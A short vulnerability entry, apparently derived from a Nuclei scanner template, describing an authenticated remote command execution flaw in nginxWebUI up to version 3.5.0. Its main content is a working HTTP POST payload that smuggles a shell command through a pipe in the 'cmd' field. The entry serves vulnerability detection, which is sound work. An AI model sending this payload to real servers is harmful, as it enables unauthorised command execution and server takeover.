# Vulnerability: nginxWebUI ≤ 3.5.0 - Remote Command Execution
**Classification:** NGINX
**Source:** Nuclei Template (`nginx-webui-rce.yaml`)

## Description
There is a command execution vulnerability in the nginxWebUI backend. After logging in to the backend, the attacker can execute any command to obtain server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /adminPage/remote/cmdOver HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

remoteId=local&cmd=start|id&interval=1
```

